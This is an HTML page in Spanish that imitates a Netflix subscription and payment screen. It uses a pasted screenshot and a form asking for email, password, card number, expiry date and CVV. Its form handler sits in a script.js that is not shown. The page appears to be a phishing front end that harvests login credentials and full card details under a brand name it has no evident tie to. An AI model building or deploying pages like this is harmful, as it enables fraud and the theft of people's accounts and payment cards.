<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Suscripción y Pago</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <img src="Captura de pantalla 2025-09-17 000044.png" alt="">
    <div class="login-container">
        <h1>¡ Netflix!</h1>
        <p>Completa la información para empezar a ver.</p>
        <form id="subscription-form">
            <input type="email" id="email" placeholder="Correo electrónico" required>
            <input type="password" id="password" placeholder="Contraseña" required>

            <div class="payment-info">
                <input type="text" id="card-number" placeholder="Número de tarjeta" required maxlength="16">
                <div class="card-details">
                    <input type="text" id="expiry-date" placeholder="MM/AA" required maxlength="5">
                    <input type="text" id="cvv" placeholder="CVV" required maxlength="3">
                </div>
            </div>

            <button type="submit">Iniciar Suscripción</button>
        </form>
        <div id="message" class="hidden"></div>
    </div>
    <script src="script.js"></script>
</body>
</html>
